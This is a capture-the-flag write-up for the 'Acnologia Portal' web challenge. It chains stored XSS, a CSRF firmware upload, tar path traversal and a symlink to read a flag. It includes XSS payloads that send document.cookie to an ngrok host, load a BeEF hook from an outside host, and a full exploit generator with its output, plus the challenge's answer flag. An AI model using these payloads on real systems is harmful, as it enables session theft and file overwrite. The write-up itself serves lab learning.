# Acnologia Portal
Top 27th to solve it

![](Pasted%20image%2020220515204941.png)

![](Pasted%20image%2020220515110019.png)

## Solution

### Looking at code

It's a Flask App in a Docker Container, with SQLAlchemy (so likely no SQLi)

Most interesting is that there is `web_acnologia_portal/challenge/application/bot.py`, which suggests that there is a client side attack involved

```python
from selenium import webdriver
from flask import current_app
import time

def visit_report():
    chrome_options = webdriver.ChromeOptions()

    chrome_options.add_argument('--headless')
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-background-networking')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-sync')
    chrome_options.add_argument('--disable-translate')
    chrome_options.add_argument('--metrics-recording-only')
    chrome_options.add_argument('--mute-audio')
    chrome_options.add_argument('--no-first-run')
    chrome_options.add_argument('--safebrowsing-disable-auto-update')
    chrome_options.add_argument('--js-flags=--noexpose_wasm,--jitless')

    client = webdriver.Chrome(chrome_options=chrome_options)
    client.set_page_load_timeout(5)
    client.set_script_timeout(5)

    client.get('http://localhost:1337/')

    username = client.find_element_by_id('username')
    password = client.find_element_by_id('password')
    login = client.find_element_by_id('login-btn')

    username.send_keys(current_app.config['ADMIN_USERNAME'])
    password.send_keys(current_app.config['ADMIN_PASSWORD'])
    login.click()
    time.sleep(3)

    client.get('http://localhost:1337/review')

    time.sleep(3)
    client.quit()
```

In `/tmp/web_acnologia_portal/challenge/application/templates/`,  there is a `review.html`, which has a `{{|safe}}` filter. This suggests that we can inject XSS

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Firmware bug reports</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet" />
  </head>
  <body>
    <nav class="navbar navbar-default bg-dark justify-content-between">
      <a class="navbar-brand ps-3" href="#">Firmware bug reports</a>
      <ul class="navbar-nav mb-2 mb-lg-0 me-5">
        <li class="nav-item">
          <a class="nav-item active" href="#">Reports</a>
        </li>
        <li class="nav-item">
          <a class="nav-item" href="/logout">Logout</a>
        </li>
      </ul>
    </nav>
    <div class="container" style="margin-top: 20px"> {% for report in reports %} <div class="card">
        <div class="card-header"> Reported by : {{ report.reported_by }}
        </div>
        <div class="card-body">
        <p class="card-title">Module ID : {{ report.module_id }}</p>
          <p class="card-text">Issue : {{ report.issue | safe }} </p>
          <a href="#" class="btn btn-primary">Reply</a>
          <a href="#" class="btn btn-danger">Delete</a>
        </div>
      </div> {% endfor %} </div>
  </body>
</html>
```

Moreover, the `routes.py` also show that the file upload requires admin access

```python
import json
from application.database import User, Firmware, Report, db, migrate_db
from application.util import is_admin, extract_firmware
from flask import Blueprint, jsonify, redirect, render_template, request
from flask_login import current_user, login_required, login_user, logout_user
from application.bot import visit_report

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

def response(message):
    return jsonify({'message': message})

@web.route('/', methods=['GET'])
def login():
    return render_template('login.html')

@api.route('/login', methods=['POST'])
def user_login():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    if not username or not password:
        return response('Missing required parameters!'), 401

    user = User.query.filter_by(username=username).first()

    if not user or not user.password == password:
        return response('Invalid username or password!'), 403

    login_user(user)
    return response('User authenticated successfully!')

@web.route('/register', methods=['GET'])
def register():
    return render_template('register.html')

@api.route('/register', methods=['POST'])
def user_registration():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    if not username or not password:
        return response('Missing required parameters!'), 401

    user = User.query.filter_by(username=username).first()

    if user:
        return response('User already exists!'), 401

    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()

    return response('User registered successfully!')

@web.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@api.route('/firmware/list', methods=['GET'])
@login_required
def firmware_list():
    firmware_list = Firmware.query.all()
    return jsonify([row.to_dict() for row in firmware_list])

@api.route('/firmware/report', methods=['POST'])
@login_required
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    module_id = data.get('module_id', '')
    issue = data.get('issue', '')

    if not module_id or not issue:
        return response('Missing required parameters!'), 401

    new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
    db.session.add(new_report)
    db.session.commit()

    visit_report()
    migrate_db()

    return response('Issue reported successfully!')

@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403

@web.route('/review', methods=['GET'])
@login_required
@is_admin
def review_report():
    Reports = Report.query.all()
    return render_template('review.html', reports=Reports)

@web.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/')
```

### Testing Web App -> XSS

I registered for an account and logged in to show the dashboard

![](Pasted%20image%2020220515112715.png)

![](Pasted%20image%2020220515111128.png)

I tried putting in XSS

```html
<img src=x onerror=this.src='http://a1e5-116-14-150-8.ngrok.io/?'+document.cookie;>
```

![](Pasted%20image%2020220515111250.png)

![](Pasted%20image%2020220515111313.png)


```bash                      
HTTP Requests                                                                                                                                                           
-------------                                                                                                                                                           
                                                                                                                                                                        
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK                                                                                                                                   
GET /                          200 OK        
```

Trying again with slightly different payload

```html
<img src=x onerror=this.src='http://a1e5-116-14-150-8.ngrok.io/test?'+document.cookie;>
```

![](Pasted%20image%2020220515111456.png)


I tried changing the payload the the BeeF-XSS Payload

```html
<script src="http://f75f-116-14-150-8.ngrok.io/hook.js"></script>
```

No hooks at all

### Testing File Uploading

I spun up a docker instance, making some tweaks such that I can log in and access the admin interface

`util.py`

```python
def is_admin(f):
    @functools.wraps(f)
    def wrap(*args, **kwargs):
        if current_user.username == current_app.config['ADMIN_USERNAME'] and request.remote_addr == '127.0.0.1':
            return f(*args, **kwargs)
        else:
            return f(*args, **kwargs)
            #return abort(401)

    return wrap

```

`config.py`

```python
    ADMIN_PASSWORD = 'admin' #generate(15)
```

I tried uploading files (with the admin cookie)

```bash
(base) [hacker@hackerbook web_acnologia_portal]$ curl localhost:1337/api/firmware/upload -X POST -H 'Cookie: session=9afbf2ab-765e-4482-beac-4883081074ea' -F file=@/tmp/t
{"message":"Something went wrong, please try again!"}
(base) [hacker@hackerbook web_acnologia_portal]$ 
(base) [hacker@hackerbook web_acnologia_portal]$ tar -czvf /tmp/test.tar.gz /tmp/t 
tar: Removing leading `/' from member names
/tmp/t
(base) [hacker@hackerbook web_acnologia_portal]$ curl localhost:1337/api/firmware/upload -X POST -H 'Cookie: session=9afbf2ab-765e-4482-beac-4883081074ea' -F file=@/tmp/test.tar.gz
{"message":"Firmware update initialized successfully."}
(base) [hacker@hackerbook web_acnologia_portal]$ 
```

```bash
/app # cd application/
blueprints/  static/      templates/
/app # cd application/static/
css/               firmware_extract/  images/            js/
/app # cd application/static/firmware_extract/
/app/application/static/firmware_extract # ls
90c4990e65027894e4b5c347ac5dcb
/app/application/static/firmware_extract # cd 90c4990e65027894e4b5c347ac5dcb/
/app/application/static/firmware_extract/90c4990e65027894e4b5c347ac5dcb # ls
tmp
/app/application/static/firmware_extract/90c4990e65027894e4b5c347ac5dcb # cd tmp/
/app/application/static/firmware_extract/90c4990e65027894e4b5c347ac5dcb/tmp # ls
t
/app/application/static/firmware_extract/90c4990e65027894e4b5c347ac5dcb/tmp # 
```

#### XSS -> CSRF File Upload 

Generating File Upload 1

```bash
(base) [hacker@hackerbook tmp]$ rm t
(base) [hacker@hackerbook tmp]$ nano AAAA
(base) [hacker@hackerbook tmp]$ tar -czvf aa.tar.gz AAAA
AAAA
(base) [hacker@hackerbook tmp]$ 
```

Payload

```html
<script>
var b64Data = "H4sIAAAAAAAAA+3OMQ7DIBBE0a19ij0CGLBr7pALoIjIVlIBuX+w08eVneY/rTTSaoqJMUY5mekm77e0czDfdHb/78Yg1o/e2N6bnfScXBA1Zw/bvGtLRVWWdH/m8quXS71i0LVuy1q1X9KWa9PH+srD8O9RAAAAAAAAAAAAAAAAAIBDH3pQVEcAKAAA";
    
async function sendFile()
{
    var FILENAME = "test.tar.gz"
    
    var ENDPOINT = "http://127.0.0.1:1337/api/firmware/upload";
    
    /// Upload file from b64 //////////////////////////
    const byteCharacters = atob(b64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    var blob = new Blob([byteArray], { type: "text/html"});
    
    /*//var URL = "http://localhost:8000/" + FILENAME;
    let blob = await fetch(URL).then(r => r.blob());
    */
    
    /// Uploading ////////////////////////////////////
    var formData = new FormData();
    formData.append("file", blob, FILENAME);
    var request = new XMLHttpRequest();
    request.open("POST", ENDPOINT);
    request.send(formData);
}
sendFile()
</script>
```

![](Pasted%20image%2020220515124055.png)

For some reason the CSRF only works when I manually accessed the review endpoint. On hindsight, Its because I used the `127.0.0.1` endpoint instead of `localhost` which the bot uses (Interferes with CORS), I'll change that down the line.

![](Pasted%20image%2020220515124105.png)

```bash
/app # ls /tmp
test.tar.gz            tmpc4uli4bncacert.pem
/app # ls application/
blueprints/  bot.py       config.py    database.db  database.py  main.py      static/      templates/   util.py
/app # ls application/static/
css/               firmware_extract/  images/            js/
/app # ls application/static/firmware_extract/
.gitkeep                         92b44b551a668caeec9258dd729d3a/
/app # ls application/static/firmware_extract/
.gitkeep                         92b44b551a668caeec9258dd729d3a/
/app # cat application/static/firmware_extract/92b44b551a668caeec9258dd729d3a/AAAA 
This is a test file

/app # 
```

### Path Traversal Using Tar

I was wondering if tar files could be automatically extracted to places other than the current directory. On compressing a tar file, it follows the path

On googling, I found that tar allows for absolute names, like this

```bash
[hacker@hackerbook Acnologia Portal]$ ls
README.md  gen_tar_file  tarfile_test.py  web_acnologia_portal.zip
[hacker@hackerbook Acnologia Portal]$ cd gen_tar_file/
[hacker@hackerbook gen_tar_file]$ ls
tmp  workdir
[hacker@hackerbook gen_tar_file]$ cd workdir/
[hacker@hackerbook workdir]$ tar -czvf test.tar.gz --absolute-names ../tmp/targetfile
../tmp/targetfile
[hacker@hackerbook workdir]$ cp test.tar.gz  /tmp/
[hacker@hackerbook workdir]$ 
[hacker@hackerbook workdir]$ ls ../tmp
targetfile
[hacker@hackerbook workdir]$ cat ../tmp/targetfile
PWNED N00B
[hacker@hackerbook workdir]$ 
```

On testing the extraction, i found out that it would work

```python
# tarfile_test.py: Based off the given code in utils.py
import functools, tarfile, tempfile, os
UPLOAD_FOLDER = "/tmp"
def extract_firmware(path):
    tmp  = tempfile.gettempdir()
    print("### tmp:", tmp, "#"*30)
    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = "rand_dir"
        extractdir = f"{UPLOAD_FOLDER}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    print("### filename:", filename, "#"*30)
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True
        
extract_firmware('/tmp/test.tar.gz')

```

```bash
(base) [hacker@hackerbook Acnologia Portal]$ ls /tmp/targetfile
ls: cannot access '/tmp/targetfile': No such file or directory
(base) [hacker@hackerbook Acnologia Portal]$ touch /tmp/targetfile
(base) [hacker@hackerbook Acnologia Portal]$ cat /tmp/targetfile 
(base) [hacker@hackerbook Acnologia Portal]$ python3 tarfile_test.py 
### tmp: /tmp ##############################
### filename: /tmp/rand_dir/../tmp/targetfile ##############################
(base) [hacker@hackerbook Acnologia Portal]$ cat /tmp/targetfile 
PWNED N00B
(base) [hacker@hackerbook Acnologia Portal]$ 
```

I could use this to overwrite files in the directory that I have control off, such as the flask program. This is very tempting as Flask could be running in debug mode, which means lazy reload is on.

### Overwriting Important Files

Now I need to find files to overwrite to result in RCE. However, after having a pair of eyes, I realised that Flask is NOT running in debug mode. As a result, attempts to replace the python code as well as the templates fail.However, I can write to the static directory (which is useless).

Pycache is disabled in the dockerfile, suggesting it is something to do with the python files 

However I tried overwriting the database (which caused it to be empty instead for some reason), the python file, the template, which all didn't work

## The Key Ingredient - Symlink

In short, I just needed to upload a symlink in the static directory (which can be done with the path traversal) to `/flag.txt`

Final Exploit

```python
import os

commands = """
cd /tmp && mkdir -p /tmp/tar_gen/workdir 
mkdir -p /tmp/tar_gen/app/application/static 
echo 'This proof was generated on' $(date) > /tmp/tar_gen/app/application/static/upload_proof.txt  &&
ln -s /flag.txt /tmp/tar_gen/app/application/static/flag.txt
cd /tmp/tar_gen/workdir
tar -czvf test.tar.gz --absolute-names ../app/application/static/upload_proof.txt ../app/application/static/flag.txt 
cp test.tar.gz /tmp/test.tar.gz
"""
print(os.popen(commands).read())

b64Data = os.popen("cat /tmp/test.tar.gz | base64").read().replace("\n", "")


output = f"""
<h1>Pwn Attempt</h1>
<script>
var b64Data = "{b64Data}";
""" + """

async function sendFile()
{
    var FILENAME = "test.tar.gz"
    
    var ENDPOINT = "http://localhost:1337/api/firmware/upload";
    
    /// Upload file from b64 //////////////////////////
    const byteCharacters = atob(b64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    var blob = new Blob([byteArray], { type: "text/html"});
    
    /*
    var URL = "http://localhost:8000/" + FILENAME;
    let blob = await fetch(URL).then(r => r.blob());
    */
    
    /// Uploading ////////////////////////////////////////////
    var formData = new FormData();
    formData.append("file", blob, FILENAME);
    var request = new XMLHttpRequest();
    request.open("POST", ENDPOINT);
    request.send(formData);
    
}
sendFile()
</script>
"""

print("### Payload #########################################")
print(output)
```


```html
[hacker@hackerbook Acnologia Portal]$ python3 exploit_gen.py 
../app/application/static/upload_proof.txt
../app/application/static/flag.txt

### Payload #########################################

<h1>Pwn Attempt</h1>
<script>
var b64Data = "H4sIAAAAAAAAA+3TwYrCMBAG4Jz3Kea+0E7S1Lq+g7Cw3iXUqMXSlDRl17c3dvEkFVFRlv0/CANDIBOGP0lS07bHU1elCZVr0i7EWqZ9WzuzWrbeuXUSfoK4GUcTrY9VFjn/1kwO/UGhhdRKx67OdS5YsZpkgvj2J6/Xx+96IrE15c76S/es754x0HMttlVHw47p23S0sY31JtgVuYa++oZkTnOzp7gRRfwxY54pSZ9zeufp26tnh/slo/lf12ZzX+5PhogXxXj+mc/yn7Eg9cAZRv3z/AMAAAAAAAAAAAAAAAAAAADA33YARdWPsAAoAAA=";


async function sendFile()
{
    var FILENAME = "test.tar.gz"
    
    var ENDPOINT = "http://localhost:1337/api/firmware/upload";
    
    /// Upload file from b64 //////////////////////////
    const byteCharacters = atob(b64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    var blob = new Blob([byteArray], { type: "text/html"});
    
    /*
    var URL = "http://localhost:8000/" + FILENAME;
    let blob = await fetch(URL).then(r => r.blob());
    */
    
    /// Uploading ////////////////////////////////////////////
    var formData = new FormData();
    formData.append("file", blob, FILENAME);
    var request = new XMLHttpRequest();
    request.open("POST", ENDPOINT);
    request.send(formData);
    
}
sendFile()
</script>

[hacker@hackerbook Acnologia Portal]$ 
```

Create an account, and submit the payload through the bug reporting system.

![](Pasted%20image%2020220515205326.png)

![](Pasted%20image%2020220515205053.png)

## Flag
`HTB{des3r1aliz3_4ll_th3_th1ngs}`

# Others

## Similar Challenges

https://linoxide.com/how-to-preserve-symbolic-links-in-tar-command/#:~:text=When%20you%20use%20%2Dh%20with,presence%20of%20a%20symbolic%20link.

https://infosecwriteups.com/hackthebox-ghoul-deb77ff43326

https://github.com/hyperreality/ctf-writeups/blob/master/2019-justctf/README.md
- Where I got the Symlink idea

## Debugging Method

1. Change the admin password from randomly generated to `admin` in `config.py`

## Proof that I can overwrite files on remote server
![](Pasted%20image%2020220515174133.png)
![](Pasted%20image%2020220515174144.png)
